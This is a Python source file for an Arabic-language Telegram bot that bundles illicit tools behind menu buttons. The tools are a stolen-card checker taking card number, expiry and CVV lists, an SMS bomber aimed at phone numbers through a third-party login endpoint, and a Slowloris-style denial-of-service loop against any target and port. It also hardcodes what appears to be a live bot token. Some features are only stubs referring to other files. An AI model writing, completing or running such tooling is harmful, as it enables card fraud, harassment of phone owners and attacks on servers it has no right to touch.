import telebot
from telebot import types
import threading
import asyncio
import aiohttp
import sqlite3
import random
import json
import socket
import os
import platform
import psutil
import struct
import time
import requests
from datetime import datetime
from queue import Queue

# --- الإعدادات الجديدة ---
BOT_TOKEN = "7725928700:AAFN07OWx1xPNhvqRwaBskGz-9CvP6YV6W0"
OWNER_ID = 1431886140
API_CHECKER = "https://api.chkr.cc/"
API_SMS = "https://api.twistmena.com/music/Dlogin/sendCode"

bot = telebot.TeleBot(BOT_TOKEN)

# --- قاعدة البيانات ---
def init_db():
    conn = sqlite3.connect('master_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, username TEXT, is_admin INTEGER DEFAULT 0,
                  sms_limit INTEGER DEFAULT 100, join_date TEXT)''')
    c.execute('''INSERT OR IGNORE INTO users (user_id, username, is_admin, sms_limit, join_date)
                 VALUES (?, ?, ?, ?, ?)''', (OWNER_ID, 'OWNER', 2, -1, datetime.now().strftime("%Y-%m-%d")))
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect('master_bot.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone()
    conn.close()
    return user

# --- وظائف جمع معلومات السيرفر (من ملف H.py) ---
def get_vps_info():
    info = {
        "IP": requests.get('https://api.ipify.org').text,
        "System": platform.system(),
        "CPU Usage": f"{psutil.cpu_percent()}%",
        "RAM": f"{psutil.virtual_memory().percent}%"
    }
    return info

# --- نظام هجمات الشبكة (من ملف D.py) ---
class NetworkAttack:
    def __init__(self, target, port, duration):
        self.target = target
        self.port = port
        self.duration = duration
        self.stop_event = threading.Event()

    def slowloris(self):
        # محاكاة الهجوم كما في D.py
        start_time = time.time()
        while not self.stop_event.is_set() and (time.time() - start_time) < self.duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
                time.sleep(1)
            except: pass

# --- لوحات المفاتيح ---
def main_markup(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    user = get_user(user_id)
    btns = [types.KeyboardButton("🔍 فحص كروت"), types.KeyboardButton("💣 SMS Bomber"), 
            types.KeyboardButton("🌐 هجوم شبكة"), types.KeyboardButton("🖥 معلومات السيرفر")]
    if user and user[2] >= 1: btns.append(types.KeyboardButton("👑 لوحة التحكم"))
    markup.add(*btns)
    return markup

# --- معالجة الأوامر ---
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if not get_user(user_id):
        conn = sqlite3.connect('master_bot.db')
        conn.execute('INSERT INTO users (user_id, username, join_date) VALUES (?, ?, ?)',
                     (user_id, message.from_user.username, datetime.now().strftime("%Y-%m-%d")))
        conn.commit()
    bot.send_message(message.chat.id, "🎯 مرحباً بك في نظام الإدارة الشامل", reply_markup=main_markup(user_id))

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text

    if text == "🖥 معلومات السيرفر":
        info = get_vps_info()
        bot.reply_to(message, f"📊 حالة السيرفر:\n🌐 IP: {info['IP']}\n💻 System: {info['System']}\n🔥 CPU: {info['CPU Usage']}\n🧠 RAM: {info['RAM']}")

    elif text == "🔍 فحص كروت":
        bot.reply_to(message, "📂 أرسل ملف .txt يحتوي على الكروت أو أرسلها نصياً بصيغة: number|month|year|cvv")

    elif text == "💣 SMS Bomber":
        msg = bot.reply_to(message, "📞 أرسل رقم الهاتف (مثال: 010xxxxxxx)")
        bot.register_next_step_handler(msg, process_sms_step)

    elif text == "🌐 هجوم شبكة":
        bot.reply_to(message, "🛠 هذه الخاصية تعمل في الخلفية، أرسل الهدف والمنفذ (target:port)")

# --- وظائف مساعدة ---
def process_sms_step(message):
    number = "2" + message.text.strip()
    bot.send_message(message.chat.id, f"⚡ جاري بدء الإرسال إلى {number}...")
    # هنا يتم استدعاء دالة الإرسال من ملف bot123.py

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cards = downloaded_file.decode('utf-8').splitlines()
        bot.reply_to(message, f"⏳ جاري فحص {len(cards)} كارت...")
        # تشغيل فحص الكروت كما في ملف Bot1.py

# --- تشغيل البوت ---
if __name__ == "__main__":
    print(f"🚀 Bot Started for Owner ID: {OWNER_ID}")
    bot.infinity_polling()